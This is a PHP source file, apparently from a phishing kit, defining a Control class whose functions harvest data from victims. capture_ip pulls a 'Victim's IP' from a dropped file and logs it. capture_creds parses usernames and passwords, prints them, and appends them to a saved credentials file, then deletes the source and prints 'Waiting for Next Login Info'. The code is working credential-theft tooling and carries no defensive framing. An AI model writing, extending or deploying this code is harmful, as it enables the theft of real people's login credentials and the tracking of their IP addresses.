<?php

class Control{
    static function capture_ip($PATH) {
        $actual_link = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]";
        $IP = explode('IP: ', file_get_contents($PATH))[1];
        echo "Victim IP Found !!\n";
        echo "\n" . 'Victim`s IP : '. $IP;
        file_put_contents('./saved/ip.dat', $IP, FILE_APPEND);
        echo "Saved in : $actual_link/saved/ip.dat\n";
        unlink($PATH);
        echo "#########################\n";
    }
    static function getDirectorySize($path) {
        $totalSize = 0;
    
        foreach (new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path)) as $file) {
            $totalSize += $file->getSize();
        }
    
        return $totalSize;
    }

    static function capture_creds($PATH) {
        $actual_link = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]";
        $data = file_get_contents($PATH);
    
        $ACCOUNT = explode('Username: ', $data)[1];
        $ACCOUNT = explode('Pass: ', $ACCOUNT)[0];
        $ACCOUNT = trim($ACCOUNT, "\n");
    
        $PASSWORD = explode('Pass: ', $data)[1];
        $PASSWORD = trim($PASSWORD);
        
        echo "Login info Found !!\n\n";
        echo "Account  : $ACCOUNT";
        echo "\nPassword : $PASSWORD";
        file_put_contents('./saved/usernames.dat', $data, FILE_APPEND);
        echo "\n\nSaved in : $actual_link/saved/usernames.dat";

        unlink($PATH);
        echo "\n\nWaiting for Next Login Info\n\n";
        echo "-------------------------\n";
    }
}

?>